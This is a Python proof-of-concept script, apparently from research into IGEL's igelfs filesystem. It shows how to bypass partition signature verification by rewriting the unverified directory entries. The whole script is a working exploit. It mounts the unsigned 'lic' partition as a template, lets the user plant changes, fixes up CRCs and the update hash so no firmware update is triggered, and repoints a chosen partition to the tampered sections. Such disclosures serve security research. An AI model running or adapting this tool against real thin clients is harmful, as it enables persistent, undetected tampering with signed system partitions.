"""
Modify partition content by modifying directory entries.

If an attacker has write-access to the disk, either by physical means or
via elevated privileges, the contents of a partition can be modified,
even if the partition has a hash and signature.

As the directory (stored in section 0 of the filesystem) is not verified in
any way, directory entries - namely partition and fragment descriptors - can be
modified freely, allowing the reported start point of a partition to be
changed.

This means the signature verification of a partition can be completely ignored,
by replacing it with a partition/first section without one. A good example of
one of these partitions is lic (254), as it is a plain ext4 filesystem
split into sections, without any verification mechanisms other than CRC.

This method does not need to overwrite legitimate data, as the payload sections
can be written to free sections, but the directory will no longer reference
the original data.

The update_hash in the partition header should match the intended partition,
else a firmware update will be triggered. If a legitimate program overwrites
the directory entry, the changes will no longer take effect, but the payload may
still be on the disk.
"""

import os
import sys
from pathlib import Path
from tempfile import NamedTemporaryFile

from igelfs import Filesystem
from igelfs.constants import DIR_OFFSET
from igelfs.models import DataModelCollection, FragmentDescriptor, Section
from igelfs.utils import run_process

LIC_PARTITION_MINOR = 254


def get_unused_fragment(filesystem: Filesystem) -> FragmentDescriptor:
    """Return fragment of unused space from directory."""
    return filesystem.directory.fragment[0]


def update_directory(
    filesystem: Filesystem, partition_minor: int, first_section: int, length: int
) -> None:
    """Update directory entry for partition_minor."""
    directory = filesystem.directory
    partition = directory.partition[partition_minor]
    fragment = directory.fragment[partition.first_fragment]
    fragment.first_section = first_section
    fragment.length = length
    directory.crc = directory.get_crc()
    filesystem.write_bytes(directory.to_bytes(), DIR_OFFSET)


def write_sections_to_unused(
    filesystem: Filesystem, sections: DataModelCollection[Section]
) -> int:
    """Write sections to unused space in filesystem, returning first section."""
    unused = get_unused_fragment(filesystem)
    if len(sections) > unused.length:
        raise ValueError(
            f"Length of sections '{len(sections)}' is greater than free space '{unused.length}'"
        )
    for index, section in enumerate(sections):
        filesystem.write_section_to_index(section, unused.first_section + index)
    return unused.first_section


def update_crc(sections: DataModelCollection[Section]) -> DataModelCollection[Section]:
    """Update CRC values of sections."""
    for section in sections:
        section.header.crc = section.get_crc()
    return sections


def get_lic_as_template(
    filesystem: Filesystem, partition_minor: int
) -> DataModelCollection[Section]:
    """Return lic partition with updated values from partition_minor."""
    lic = filesystem.find_sections_by_directory(LIC_PARTITION_MINOR)
    template = filesystem.find_sections_by_directory(partition_minor)
    lic[0].partition.header.update_hash = template[0].partition.header.update_hash
    return update_crc(lic)


def mount_payload_of(
    sections: DataModelCollection[Section], mountpoint: str | os.PathLike
) -> Path:
    """Mount payload of sections, returning Path of payload."""
    payload = Section.get_payload_of(sections)
    fd = NamedTemporaryFile(delete=False)
    fd.write(payload)
    path = Path(fd.name)
    run_process(["mount", path, mountpoint])
    return path


def unmount_payload_and_update(
    path: str | os.PathLike, sections: DataModelCollection[Section]
) -> DataModelCollection[Section]:
    """Umount payload and write to sections."""
    run_process(["umount", path])
    with open(path, "rb") as fd:
        data = fd.read()
    if sections[0].hash:
        data = sections[0].hash.to_bytes() + data
        sections[0].hash = None
    if sections[0].partition:
        data = sections[0].partition.to_bytes() + data
        sections[0].partition = None
    payload = Section.split_into_sections(data)
    if len(payload) != len(sections):
        raise ValueError("Number of sections do not match")
    for index, section in enumerate(sections):
        sections[index].data = payload[index]
    return update_crc(sections)


def main() -> None:
    """Handle command-line arguments and modify filesystem."""
    if len(sys.argv) < 4:
        print("Usage: <filesystem> <partition minor> <mountpoint>")
        sys.exit(1)
    filesystem = Filesystem(sys.argv[1])
    partition_minor = int(sys.argv[2])
    mountpoint = sys.argv[3]
    lic = get_lic_as_template(filesystem, partition_minor)
    path = mount_payload_of(lic, mountpoint)
    input(f"Make any changes to {mountpoint} then press Enter.")
    payload = unmount_payload_and_update(path, lic)
    if not all(section.verify() for section in payload):
        raise ValueError("Payload did not verify successfully")
    first_section = write_sections_to_unused(filesystem, payload)
    update_directory(filesystem, partition_minor, first_section, len(payload))
    if not filesystem.directory.verify():
        raise ValueError("Directory did not verify successfully")


if __name__ == "__main__":
    main()
